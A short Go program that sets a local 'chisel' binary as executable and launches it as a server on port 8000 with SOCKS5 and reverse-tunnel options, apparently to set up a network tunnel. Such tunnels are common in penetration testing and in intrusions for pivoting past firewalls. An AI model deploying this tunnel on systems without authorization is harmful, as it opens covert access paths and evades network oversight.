package main

import (
	"fmt"
	"os/exec"
)

func main() {
    var cmd *exec.Cmd
    var err error
    cmd = exec.Command("chmod", "+x", "./chisel")
    err = cmd.Run()
    if err != nil {
        fmt.Printf("run chmod return error %v\n", err)
        return
    }
    cmd = exec.Command("./chisel", "--port", "8000", "--backend", "--socks5", "--reverse")
    err = cmd.Start()
    if err != nil {
        fmt.Printf("start chisel return error %v\n", err)
    }
    return
}